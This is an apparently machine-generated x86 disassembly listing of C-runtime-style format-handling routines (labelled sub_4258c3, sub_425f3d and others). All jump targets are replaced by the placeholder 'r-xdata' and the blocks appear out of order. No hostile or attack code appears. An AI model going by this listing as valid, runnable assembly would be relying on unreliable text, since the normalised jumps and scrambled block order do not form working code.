neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41baab
push edx
push ecx
mov ecx esi
call sub_41c073
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_42564f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bb20
push edx
push ecx
mov ecx esi
call sub_41c0fb
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425789
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bb95
push edx
push ecx
mov ecx esi
call sub_41c183
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4258c3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_4193b3
call sub_41913b
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
xor al al
jmp r-xdata
test al al
jne r-xdata
call sub_4199d3
jmp r-xdata
call sub_41962b
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_419ec5
jmp r-xdata
call sub_419c47
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41aec5
jmp r-xdata
call sub_41ac0d
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bc0a
push edx
push ecx
mov ecx esi
call sub_41c20b
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425a29
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bc7f
push edx
push ecx
mov ecx esi
call sub_41c293
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425b63
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bcf4
push edx
push ecx
mov ecx esi
call sub_41c31b
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425c9d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_419432
call sub_4191ba
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
mov ecx esi
call sub_41f310
test al al
je r-xdata
xor al al
jmp r-xdata
test al al
jne r-xdata
call sub_419a52
jmp r-xdata
call sub_4196aa
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_419f4b
jmp r-xdata
call sub_419cc4
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41af53
jmp r-xdata
call sub_41ac9b
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bd69
push edx
push ecx
mov ecx esi
call sub_41c3a3
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425e03
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_423023
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bdde
push edx
push ecx
mov ecx esi
call sub_41c42b
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425f3d
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_425fb1
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a5d9
test al al
jne r-xdata
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435cb4
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_42604a
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4260be
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_426132
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a657
test al al
jne r-xdata
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435cb4
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4261cb
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_42623f
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4262b3
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a6d5
test al al
jne r-xdata
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435cb4
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_42634c
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_4263c0
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_435cb4
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_426434
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a753
test al al
jne r-xdata
mov ecx esi
call sub_41f310
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
call sub_435cb4
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x2c ]
call sub_423023
pop ecx
sub eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ esi + 0x18 ]
mov [ eax ] cl
sub eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov cx [ esi + 0x18 ]
mov [ eax ] cx
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x18 ]
mov [ eax ] ecx
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ ebp - 0x4 ]
cdq
mov [ ecx ] eax
